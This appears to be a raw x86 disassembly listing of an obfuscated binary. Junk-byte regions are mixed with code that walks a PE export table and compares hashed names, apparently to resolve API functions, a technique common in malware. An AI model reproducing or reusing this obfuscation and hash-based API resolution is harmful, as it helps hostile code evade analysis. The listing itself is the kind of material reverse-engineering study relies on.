  40bfcf:	add    al,0x42
  40bfd1:	int3   
  40bfd2:	jnp    0x40c018
  40bfd4:	xchg   ebp,eax
  40bfd5:	xor    al,0xaa
  40bfd7:	push   0xffffffc7
  40bfd9:	mov    edi,0x6fab63a
  40bfde:	(bad)  
  40bfdf:	int3   
  40bfe0:	pop    edx
  40bfe1:	xor    al,0x18
  40bfe3:	pop    eax
  40bfe4:	add    al,0xa2
  40bfe6:	or     bl,al
  40bfe8:	pusha  
  40bfe9:	dec    ebp
  40bfea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfeb:	push   edx
  40bfec:	pop    eax
  40bfed:	pop    esi
  40bfee:	test   BYTE PTR [eax-0x30],dh
  40bff1:	arpl   WORD PTR [edx],di
  40bff3:	mov    ds:0xc9b11d5b,eax
  40bff8:	pop    eax
  40bff9:	clc    
  40bffa:	jb     0x40bfd9
  40bffc:	ror    DWORD PTR [ecx],0xe1
  40bfff:	pop    eax
  40c000:	nop
  40c001:	mov    ecx,0xb488978d
  40c006:	loopne 0x40bfda
  40c008:	adc    edi,ecx
  40c00a:	pop    ebx
  40c00c:	adc    BYTE PTR [eax],cl
  40c00e:	push   esp
  40c00f:	cdq    
  40c010:	sbb    ah,0xf1
  40c013:	mov    cs,WORD PTR [edi+esi*1+0x63]
  40c017:	inc    esi
  40c018:	or     eax,0xbf72685f
  40c01d:	bound  esp,QWORD PTR [ecx]
  40c01f:	mov    fs,WORD PTR [ebx-0x56f0748]
  40c025:	or     eax,0x4bb5380f
  40c02a:	mov    ah,0x84
  40c02c:	push   eax
  40c02d:	sbb    eax,0x1526d816
  40c032:	retf   0xfe4b
  40c035:	xchg   DWORD PTR [ecx-0x69a83f3e],ebp
  40c03b:	cbw    
  40c03d:	xchg   ebp,eax
  40c03e:	add    ebx,DWORD PTR [edi+0x1242b178]
  40c044:	sbb    BYTE PTR [edx],dl
  40c046:	hlt    
  40c047:	into   
  40c048:	mov    ah,0x37
  40c04a:	xor    al,0x8c
  40c04c:	pop    esi
  40c04d:	adc    BYTE PTR [esi+ebp*1],0x73
  40c051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c052:	shl    esi,cl
  40c054:	dec    ebx
  40c055:	xlat   BYTE PTR ds:[ebx]
  40c056:	xchg   esp,eax
  40c057:	or     DWORD PTR [esi],0xd13cbf64
  40c05d:	fs cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40c060:	outs   dx,BYTE PTR ds:[esi]
  40c061:	adc    al,0x68
  40c063:	imul   edx,edx,0xffffffc7
  40c066:	mov    dl,0x2d
  40c068:	mov    eax,0x1586aa2d
  40c06d:	cmp    bl,al
  40c06f:	mov    ds:0x80c85486,eax
  40c074:	push   edx
  40c075:	outs   dx,DWORD PTR ds:[esi]
  40c076:	out    0xb,al
  40c078:	sbb    eax,0x299e071c
  40c07d:	es and al,0x1a
  40c080:	imul   ecx,DWORD PTR [ecx-0x7d],0x4b2ff3b6
  40c087:	popf   
  40c088:	and    al,0xb6
  40c08a:	push   eax
  40c08b:	mov    ch,0xe
  40c08d:	adc    DWORD PTR [edi+0x35],esp
  40c090:	xchg   DWORD PTR [eax+0x3021d013],eax
  40c096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c097:	add    ecx,DWORD PTR [eax+0x20]
  40c09a:	mov    eax,ds:0x4306c2
  40c09f:	or     eax,DWORD PTR ds:0x42ef8c
  40c0a5:	mov    ds:0x4306c2,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ef9c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43061e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e8e2
  40c0cb:	mov    ds:0x43061e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x430626,0x0
  40c0dd:	mov    eax,ds:0x430626
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x430626,eax
  40c0e8:	cmp    DWORD PTR ds:0x430626,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x430632
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e8f6
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42ea73
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42ec74
  40c11d:	cmp    DWORD PTR ds:0x430626,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	jmp    0x33153939
  40c14b:	std    
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c1cd
  40c153:	cwde   
  40c154:	xor    ch,cl
  40c156:	xchg   edx,eax
  40c157:	pop    edx
  40c158:	inc    cl
  40c15a:	test   BYTE PTR [edi+0x178b70d3],dl
  40c160:	dec    esp
  40c161:	xchg   esi,eax
  40c162:	sub    al,0x71
  40c164:	mov    dh,0xe6
  40c166:	push   esi
  40c167:	cmp    ecx,DWORD PTR [esi-0x3b5c82f5]
  40c16d:	(bad)  
  40c16f:	sti    
  40c170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c171:	(bad)  
  40c172:	std    
  40c173:	dec    edx
  40c174:	jl     0x40c110
  40c176:	ins    DWORD PTR es:[edi],dx
  40c177:	pop    edi
  40c178:	lods   eax,DWORD PTR ds:[esi]
  40c179:	cmp    dl,BYTE PTR [eax-0x23]
  40c17c:	and    BYTE PTR [ebx-0x5c],cl
  40c17f:	jg     0x40c190
  40c181:	push   esp
  40c182:	shl    BYTE PTR [ebx+edx*4-0xf886259],0x47
  40c18a:	aam    0x70
  40c18c:	iret   
  40c18d:	sahf   
  40c18e:	bound  esp,QWORD PTR [edx+eiz*4-0x17]
  40c192:	(bad)  
  40c193:	or     dh,bl
  40c195:	xor    DWORD PTR [ecx],edx
  40c197:	enter  0x18be,0x24
  40c19b:	inc    esi
  40c19c:	test   eax,0xf9d75277
  40c1a1:	setno  BYTE PTR [ecx+0x68]
  40c1a5:	push   ecx
  40c1a6:	inc    esi
  40c1a7:	push   eax
  40c1a8:	ds jle 0x40c142
  40c1ab:	fisubr DWORD PTR [ebx-0x24]
  40c1ae:	cdq    
  40c1af:	(bad)  
  40c1b0:	ss js  0x40c18a
  40c1b3:	mov    WORD PTR [ebx+0x45e96103],?
  40c1b9:	out    dx,al
  40c1ba:	jle    0x40c22f
  40c1bc:	xchg   ecx,eax
  40c1bd:	and    edi,DWORD PTR [eax-0x1d]
  40c1c0:	jmp    0x40c186
  40c1c2:	bound  esi,QWORD PTR [ebx]
  40c1c4:	fnstsw WORD PTR [edi]
  40c1c6:	push   ax
  40c1c8:	jmp    0x9f26:0xdb432825
  40c1cf:	popf   
  40c1d0:	cmp    DWORD PTR [edx+0x5e8db741],edi
  40c1d6:	inc    edx
  40c1d7:	fs je  0x40c196
  40c1da:	mov    DWORD PTR [esi+0x6f],ebp
  40c1dd:	fdivr  st,st(3)
  40c1df:	test   al,0xb8
  40c1e1:	push   edx
  40c1e2:	and    ecx,DWORD PTR [esi-0x1]
  40c1e5:	lods   al,BYTE PTR ds:[esi]
  40c1e6:	fwait
  40c1e7:	sbb    dh,BYTE PTR [ecx-0x31]
  40c1ea:	pop    eax
  40c1eb:	shr    ebp,1
  40c1ed:	cwde   
  40c1ee:	call   0x22f130d4
  40c1f3:	dec    ecx
  40c1f4:	lea    ebp,[ebp-0x7b]
  40c1f7:	aaa    
  40c1f8:	lods   eax,DWORD PTR ds:[esi]
  40c1f9:	xlat   BYTE PTR ds:[ebx]
  40c1fa:	mov    ebx,0x3d2d5fa3
  40c1ff:	sub    al,0xd7
  40c201:	aad    0x1f
  40c203:	sub    al,BYTE PTR [edx-0x15]
  40c206:	je     0x40c1ef
  40c208:	adc    bh,BYTE PTR [ebx+esi*1+0x7a]
  40c20c:	push   esp
  40c20d:	outs   dx,BYTE PTR ds:[esi]
  40c20e:	jo     0x40c22c
  40c210:	dec    edi
  40c211:	jnp    0x40c22a
  40c213:	out    dx,eax
  40c214:	int    0x15
  40c216:	sub    BYTE PTR [ebx],0x80
  40c219:	push   ss
  40c21a:	fmul   DWORD PTR [esi+0x54bbe097]
  40c220:	data16 ins BYTE PTR es:[edi],dx
  40c222:	es scas eax,DWORD PTR es:[edi]
  40c224:	sbb    eax,0x8f69bd85
  40c229:	popa   
  40c22a:	inc    eax
  40c22b:	sbb    BYTE PTR [esi-0x1f],dh
  40c22e:	and    al,0x10
  40c230:	sar    BYTE PTR fs:[ebx],cl
  40c233:	mov    al,0x18
  40c235:	pop    esi
  40c236:	xchg   esi,eax
  40c237:	std    
  40c238:	out    dx,al
  40c239:	gs push ebp
  40c23b:	or     eax,0x130548f5
  40c240:	ds pop ss
  40c242:	pop    eax
  40c243:	push   esp
  40c244:	and    ebp,DWORD PTR [eax]
  40c246:	jbe    0x40c24b
  40c248:	mov    ecx,0xe4625763
  40c24d:	cwde   
  40c24e:	repz stc 
  40c250:	retf   0x7526
  40c253:	sub    DWORD PTR [edx+0x15],esi
  40c256:	out    dx,eax
  40c257:	inc    eax
  40c258:	push   edx
  40c259:	jp     0x40c238
  40c25b:	test   DWORD PTR [edx-0x8],edi
  40c25e:	adc    ah,BYTE PTR [esi]
  40c260:	lods   eax,DWORD PTR ds:[esi]
  40c261:	mov    bh,0x83
  40c263:	loope  0x40c262
  40c265:	pop    ebx
  40c266:	imul   esi,eax,0x7f
  40c269:	or     dl,BYTE PTR [ecx+ebx*2]
  40c26c:	in     eax,0xf8
  40c26e:	test   BYTE PTR [edi],bh
  40c270:	in     al,0x2e
  40c272:	push   es
  40c273:	mov    BYTE PTR [edx+0x173cf122],ah
  40c279:	fidivr DWORD PTR [edi-0xe]
  40c27c:	lods   eax,DWORD PTR ds:[esi]
  40c27d:	push   ebp
  40c27e:	sar    DWORD PTR [edi+eax*1-0x258cc01e],0x98
  40c286:	dec    esp
  40c287:	pop    sp
  40c289:	test   cl,dl
  40c28b:	mov    ?,WORD PTR [eax]
  40c28d:	bound  esp,QWORD PTR [edx-0x7a461aad]
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x34e92bcc,0xf371ef54
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c302
  40c2bd:	pop    ds
  40c2be:	mov    cl,0xdd
  40c2c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2c1:	jg     0x40c276
  40c2c3:	jns    0x40c278
  40c2c5:	and    bh,al
  40c2c7:	mov    gs,ebp
  40c2c9:	dec    esi
  40c2ca:	and    al,0xa
  40c2cc:	jle    0x40c2f8
  40c2ce:	outs   dx,DWORD PTR ds:[esi]
  40c2cf:	loopne 0x40c300
  40c2d1:	jns    0x40c317
  40c2d3:	cmp    dh,BYTE PTR [esi+0x73]
  40c2d6:	jb     0x40c291
  40c2d8:	jne    0x40c2d6
  40c2da:	xchg   esi,eax
  40c2db:	sbb    dh,BYTE PTR [ebx]
  40c2dd:	jnp    0x40c289
  40c2df:	inc    ecx
  40c2e0:	(bad)  
  40c2e1:	sahf   
  40c2e2:	fs xchg ebx,ebx
  40c2e5:	mov    ds:0x5d609975,eax
  40c2ea:	fcomp  DWORD PTR [eax]
  40c2ec:	sbb    al,0x88
  40c2ee:	add    bl,BYTE PTR [esi+0x5d7c2475]
  40c2f4:	xor    BYTE PTR [ebp-0x32],al
  40c2f7:	pop    ebx
  40c2f8:	dec    ebx
  40c2f9:	fcomp  QWORD PTR [eax+eiz*8-0x73]
  40c2fd:	fiadd  DWORD PTR [esi+esi*4]
  40c300:	dec    ebp
  40c301:	popf   
  40c302:	in     al,0xa
  40c304:	add    DWORD PTR [ecx+0x246d6323],edx
  40c30a:	(bad)  
  40c30b:	pop    edi
  40c30c:	fisttp WORD PTR [edx]
  40c30e:	jmp    0x40c2ec
  40c310:	xchg   edx,eax
  40c311:	js     0x40c320
  40c313:	popa   
  40c314:	leave  
  40c315:	jmp    0xb84196a
  40c31a:	adc    edx,DWORD PTR [edx+ebx*4+0x3451eb8d]
  40c321:	pop    esi
  40c322:	xchg   ebx,eax
  40c323:	dec    esi
  40c324:	shl    BYTE PTR [ebx],cl
  40c326:	loopne 0x40c2d7
  40c328:	or     dl,al
  40c32a:	dec    esi
  40c32b:	(bad)  
  40c32d:	rol    BYTE PTR [ecx+0x2],1
  40c330:	icebp  
  40c331:	into   
  40c332:	stc    
  40c333:	fs loope 0x40c368
  40c336:	retf   0xf197
  40c339:	or     BYTE PTR [ebp+0x2b74d541],ah
  40c33f:	(bad)  
  40c340:	cmc    
  40c341:	fisubr WORD PTR [edi+0x7fc37b]
  40c347:	rol    DWORD PTR [ebp+0x2e1771be],0x37
  40c34e:	xor    al,0x8c
  40c350:	jg     0x40c38d
  40c352:	and    edi,edi
  40c354:	adc    DWORD PTR [edi-0x7a],ecx
  40c357:	ret    0xa70b
  40c35a:	data16 jns 0x40c332
  40c35d:	in     al,dx
  40c35e:	div    BYTE PTR [eax-0x59]
  40c361:	in     al,0xc9
  40c363:	xor    cl,BYTE PTR [ecx-0x45bc8498]
  40c369:	pop    ds
  40c36a:	sub    DWORD PTR [edi+0x41ebfe5f],0x5b
  40c371:	jno    0x40c3a3
  40c373:	sbb    al,0x24
  40c375:	push   edi
  40c376:	test   DWORD PTR [eax],0x6d09b928
  40c37c:	cwde   
  40c37d:	outs   dx,BYTE PTR ds:[esi]
  40c37e:	mov    ah,0x61
  40c380:	dec    edx
  40c381:	adc    edx,DWORD PTR [ebx+0x78ce1ddc]
  40c387:	cmp    BYTE PTR gs:[eax],cl
  40c38a:	xlat   BYTE PTR ds:[ebx]
  40c38b:	hlt    
  40c38c:	stos   DWORD PTR es:[edi],eax
  40c38d:	xchg   esp,eax
  40c38e:	test   ecx,ebx
  40c390:	mov    esi,0xbb2f4c79
  40c395:	enter  0xe9a4,0x4b
  40c399:	cmp    BYTE PTR [edi-0x33],al
  40c39c:	cld    
  40c39d:	jmp    DWORD PTR [ecx]
  40c39f:	inc    edx
  40c3a0:	or     eax,0x77ce9e36
  40c3a5:	popa   
  40c3a6:	ins    DWORD PTR es:[edi],dx
  40c3a7:	retf   
  40c3a8:	ins    DWORD PTR es:[edi],dx
  40c3a9:	add    BYTE PTR [ecx+0x7a025669],ah
  40c3af:	mov    edi,0xd7191334
  40c3b4:	cdq    
  40c3b5:	retf   0xae43
  40c3b8:	mov    cs,WORD PTR [eax]
  40c3ba:	stos   BYTE PTR es:[edi],al
  40c3bb:	pop    edx
  40c3bc:	das    
  40c3bd:	and    al,0x7e
  40c3bf:	loop   0x40c3fd
  40c3c1:	sub    al,0x32
  40c3c3:	cmc    
  40c3c4:	mov    ch,0x58
  40c3c6:	hlt    
  40c3c7:	(bad)  
  40c3c8:	or     edx,ebp
  40c3ca:	aas    
  40c3cb:	adc    esi,DWORD PTR [ecx-0x74cb20d8]
  40c3d1:	mov    BYTE PTR ds:0xe813493c,dl
  40c3d7:	je     0x40c41b
  40c3d9:	rol    edx,1
  40c3db:	(bad)  
  40c3dc:	loop   0x40c38f
  40c3de:	adc    al,0x4d
  40c3e0:	lds    esi,FWORD PTR [esi]
  40c3e2:	jg     0x40c39f
  40c3e4:	sub    BYTE PTR [esp+edx*8],0x56
  40c3e8:	sub    eax,0x6c3e62d
  40c3ed:	pop    ds
  40c3ee:	adc    DWORD PTR [esi+ebp*4],esp
  40c3f1:	fdivr  QWORD PTR [esi+0x1d]
  40c3f4:	adc    DWORD PTR [eax-0x49],eax
  40c3f7:	add    BYTE PTR [esi+0x6e],dh
  40c3fa:	cdq    
  40c3fb:	push   0x6b
  40c3fd:	lea    eax,[ebp-0x8]
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	sub    ebx,DWORD PTR [edx-0x21]
  40c414:	mov    DWORD PTR [edi+edi*8+0x7f3f7e7e],esi
  40c41b:	jle    0x40c49b
  40c41d:	xchg   ebp,eax
  40c41e:	inc    ebp
  40c41f:	dec    esp
  40c420:	push   es
  40c421:	out    0x6a,al
  40c423:	sub    eax,0x95ed5c63
  40c428:	jp     0x40c405
  40c42a:	sysret 
  40c42c:	pop    ecx
  40c42d:	sar    DWORD PTR [eax+0x721d0bac],0xd6
  40c434:	mov    ds:0xfc2fc14f,al
  40c439:	xchg   ebp,eax
  40c43a:	inc    eax
  40c43b:	fdiv   st(2),st
  40c43d:	xchg   DWORD PTR [ebx+ebp*8+0x45],edx
  40c441:	lods   eax,DWORD PTR ds:[esi]
  40c442:	rcl    BYTE PTR [esi+0x30325216],0xf6
  40c449:	fidivr DWORD PTR [ebx-0x50]
  40c44c:	arpl   WORD PTR [ebx],cx
  40c44e:	jbe    0x40c40e
  40c450:	(bad)  
  40c451:	out    0xef,al
  40c453:	fdiv   st(3),st
  40c455:	in     eax,0xb3
  40c457:	in     eax,0x86
  40c459:	jae    0x40c457
  40c45b:	or     al,0x1a
  40c45d:	ror    DWORD PTR [edx+0x5e],1
  40c460:	sbb    al,BYTE PTR [ecx]
  40c462:	xchg   esp,eax
  40c463:	mov    al,0x6b
  40c465:	inc    esp
  40c466:	mov    ah,0x55
  40c468:	inc    ebp
  40c469:	cld    
  40c46a:	inc    BYTE PTR [edi]
  40c46c:	mov    esp,0xf4e44dcc
  40c471:	dec    esi
  40c472:	outs   dx,DWORD PTR ds:[esi]
  40c473:	inc    ecx
  40c474:	mov    esi,0x6e26da2d
  40c479:	push   0x1a5670ca
  40c47e:	das    
  40c47f:	shr    dl,1
  40c481:	aaa    
  40c482:	in     al,dx
  40c483:	sahf   
  40c484:	sbb    eax,0x5f
  40c487:	jmp    0xb22922
  40c48c:	jne    0x40c49f
  40c48e:	mov    edi,0xa6a165f5
  40c493:	pop    edx
  40c494:	sub    DWORD PTR [edx+eax*8-0x27],esi
  40c498:	imul   esp,DWORD PTR [edi],0x20
  40c49b:	jns    0x40c44b
  40c49d:	fstp   DWORD PTR [eax-0x166b0493]
  40c4a3:	je     0x40c466
  40c4a5:	push   esi
  40c4a6:	dec    eax
  40c4a7:	pop    ss
  40c4a8:	test   DWORD PTR [esi],edi
  40c4aa:	out    dx,eax
  40c4ab:	cmp    DWORD PTR [ebx+0x6b5a8a4b],edi
  40c4b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4b2:	lock mov ebx,0x7d616e68
  40c4b8:	xor    cl,BYTE PTR [edi-0x49d42522]
  40c4be:	clc    
  40c4bf:	add    BYTE PTR [eax-0x76],0x68
  40c4c3:	test   DWORD PTR [esi],esp
  40c4c5:	cld    
  40c4c6:	cmp    eax,0x3cefc9c7
  40c4cb:	cmp    ch,dh
  40c4cd:	cld    
  40c4ce:	loopne 0x40c480
  40c4d0:	clc    
  40c4d1:	out    0x9f,eax
  40c4d3:	jbe    0x40c47f
  40c4d5:	xchg   esp,eax
  40c4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d7:	retf   0xf7de
  40c4da:	in     al,dx
  40c4db:	scas   al,BYTE PTR es:[edi]
  40c4dc:	dec    ecx
  40c4dd:	dec    edx
  40c4de:	mov    BYTE PTR [eax+0x7ac4a226],ah
  40c4e4:	xor    DWORD PTR [edi],ebp
  40c4e6:	int3   
  40c4e7:	pushf  
  40c4e8:	jge    0x40c48b
  40c4ea:	nop
  40c4eb:	adc    DWORD PTR ds:0x7a3e068d,edi
  40c4f1:	(bad)  
  40c4f2:	repnz mov esp,0x812ae899
  40c4f8:	ds test eax,0xa5505030
  40c4fe:	out    dx,al
  40c4ff:	sub    ah,al
  40c501:	(bad)  
  40c503:	dec    esp
  40c504:	call   0x73e31447
  40c509:	or     cl,BYTE PTR [edx*2+0x548fd48d]
  40c510:	stos   BYTE PTR es:[edi],al
  40c511:	imul   ebp,DWORD PTR [eax+0x55934b04],0xffffff95
  40c518:	jae    0x40c4a1
  40c51a:	sbb    esp,0x1dd90a1a
  40c520:	cmp    dl,BYTE PTR ds:0x7ab421e7
  40c526:	mov    dh,0x35
  40c528:	inc    esp
  40c529:	xchg   edi,eax
  40c52a:	repnz aam 0x65
  40c52d:	fisttp DWORD PTR [eax-0x15]
  40c530:	or     ecx,edx
  40c532:	or     eax,0x55ad2edd
  40c537:	rcr    dh,cl
  40c539:	xchg   DWORD PTR [ebp+0x1bb208d5],ebx
  40c53f:	retf   
  40c540:	and    DWORD PTR [esi],0x8
  40c543:	add    edx,ebx
  40c545:	dec    ebx
  40c546:	dec    ebp
  40c547:	rcl    BYTE PTR [esp+ebx*2],0xec
  40c54b:	retf   0x6581
  40c54e:	aas    
  40c54f:	add    BYTE PTR [ebx+0x67],dh
  40c552:	(bad)  
  40c553:	(bad)  
  40c554:	cvttps2pi mm3,QWORD PTR [eax-0x1f]
  40c558:	ins    DWORD PTR es:[edi],dx
  40c559:	cdq    
  40c55a:	sub    ecx,DWORD PTR [esi+0x4d89e239]
  40c560:	rcl    BYTE PTR [eax-0x1],1
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x320d7e21
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5d7
  40c58e:	push   eax
  40c58f:	dec    edi
  40c590:	adc    ecx,edi
  40c592:	cwde   
  40c593:	mov    edi,0x76e80720
  40c598:	sub    al,0xb8
  40c59a:	pop    ecx
  40c59b:	cmp    edx,DWORD PTR [edx-0x28]
  40c59e:	(bad)  
  40c59f:	out    0x68,eax
  40c5a1:	push   ss
  40c5a2:	clc    
  40c5a3:	push   edi
  40c5a4:	pop    ebp
  40c5a5:	mov    ds:0x5240b124,eax
  40c5aa:	pop    es
  40c5ab:	idiv   BYTE PTR [eax]
  40c5ad:	pop    esi
  40c5ae:	add    al,0x46
  40c5b0:	cli    
  40c5b1:	shr    DWORD PTR [esi+edx*1],1
  40c5b4:	and    DWORD PTR [eax-0x3b],ebx
  40c5b7:	addr16 pop edi
  40c5b9:	(bad)  
  40c5bb:	or     esi,DWORD PTR [edx-0x451ab4b2]
  40c5c1:	int3   
  40c5c2:	jle    0x40c557
  40c5c4:	fwait
  40c5c5:	xchg   esi,eax
  40c5c6:	fwait
  40c5c7:	aad    0xc9
  40c5c9:	inc    eax
  40c5ca:	dec    ebx
  40c5cb:	jge    0x40c5af
  40c5cd:	shl    DWORD PTR gs:[ecx-0x4b66f5bd],1
  40c5d4:	xchg   ebp,eax
  40c5d5:	retf   0xbc46
  40c5d8:	jmp    0x1295:0xb2c30f42
  40c5df:	and    BYTE PTR [ebp-0x2cfcc55b],dh
  40c5e5:	shr    DWORD PTR [edi-0x65],0xa1
  40c5e9:	inc    esi
  40c5ea:	jmp    0x1f0f:0xe2a9ad5a
  40c5f1:	daa    
  40c5f2:	rcr    BYTE PTR [ebx],1
  40c5f4:	push   edx
  40c5f5:	out    dx,al
  40c5f6:	cs inc edi
  40c5f8:	imul   esp,DWORD PTR [esi+0x2f9dc7db],0x76
  40c5ff:	lods   eax,DWORD PTR ds:[esi]
  40c600:	add    eax,0xfd06ece5
  40c605:	push   es
  40c606:	jb     0x40c674
  40c608:	dec    ecx
  40c609:	mov    cl,0xb9
  40c60b:	or     ecx,DWORD PTR [edx+ebx*8]
  40c60e:	addr16 inc ebp
  40c610:	mov    eax,0xd67b25a9
  40c615:	scas   eax,DWORD PTR es:[edi]
  40c616:	test   al,0x9e
  40c618:	fldcw  WORD PTR [ecx-0x57ae4bb7]
  40c61e:	pop    edi
  40c61f:	inc    DWORD PTR [esi]
  40c621:	mov    ds:0x63fcf4b6,eax
  40c626:	pop    ebp
  40c627:	and    cl,dh
  40c629:	jl     0x40c620
  40c62b:	push   ebp
  40c62c:	add    DWORD PTR [ecx-0x769e6b1e],edx
  40c632:	sbb    al,0xdc
  40c634:	pop    edx
  40c635:	dec    esi
  40c636:	mov    cs,ebp
  40c638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c639:	in     al,0xdf
  40c63b:	addr16 xchg esi,eax
  40c63d:	call   0x5d50:0xfaa546e0
  40c644:	pop    ebp
  40c645:	jnp    0x40c647
  40c647:	fidiv  WORD PTR [esi]
  40c649:	shl    DWORD PTR [ebx+ecx*1-0x72],0x56
  40c64e:	rcr    DWORD PTR [ebp-0x37],0x29
  40c652:	clc    
  40c653:	popf   
  40c654:	add    eax,0x71caefe9
  40c659:	test   al,0xf4
  40c65b:	in     eax,dx
  40c65c:	jno    0x40c641
  40c65e:	imul   eax,DWORD PTR [edx-0x12]
  40c662:	call   0xabbcabc0
  40c667:	into   
  40c668:	push   esi
  40c669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c66a:	neg    BYTE PTR [edx-0x3bbe6a4f]
  40c670:	jae    0x40c6e7
  40c672:	cdq    
  40c673:	jns    0x40c680
  40c675:	test   esi,eax
  40c677:	out    dx,eax
  40c678:	loop   0x40c660
  40c67a:	ins    BYTE PTR es:[edi],dx
  40c67b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67c:	mov    al,ds:0x8148a180
  40c681:	outs   dx,DWORD PTR ds:[esi]
  40c682:	xor    al,0xb3
  40c684:	sbb    bh,BYTE PTR [eax]
  40c686:	sbb    al,bh
  40c688:	ja     0x40c67d
  40c68a:	add    cl,bl
  40c68c:	imul   edx,esp,0xfffffffa
  40c68f:	ret    
  40c690:	imul   ebx,DWORD PTR [ebx-0x27512f8],0x10af69ac
  40c69a:	xor    al,0xe3
  40c69c:	pop    esi
  40c69d:	mov    dh,BYTE PTR [ebx-0x5]
  40c6a0:	xchg   ebp,eax
  40c6a1:	aaa    
  40c6a2:	inc    esp
  40c6a3:	pushf  
  40c6a4:	bound  edi,QWORD PTR [esi+0x5b033918]
  40c6aa:	pop    eax
  40c6ab:	inc    esp
  40c6ac:	sub    edx,edx
  40c6ae:	mov    ds:0xc338f6fa,eax
  40c6b3:	mov    ebx,0xbe85988b
  40c6b8:	shl    al,0x87
  40c6bb:	jae    0x40c732
  40c6bd:	call   0x5ca2:0x93064b54
  40c6c4:	in     al,dx
  40c6c5:	into   
  40c6c6:	test   al,0x71
  40c6c8:	jbe    0x40c742
  40c6ca:	or     eax,ecx
  40c6cc:	push   ds
  40c6cd:	jb     0x40c65a
  40c6cf:	dec    ebp
  40c6d0:	clc    
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	adc    DWORD PTR [esi-0xdc940fa],edx
  40c746:	jle    0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c772
  40c74d:	(bad)  
  40c74e:	sahf   
  40c74f:	cmp    al,0x88
  40c751:	xlat   BYTE PTR ds:[ebx]
  40c752:	mov    ecx,0x47f1d701
  40c757:	repnz test al,0x50
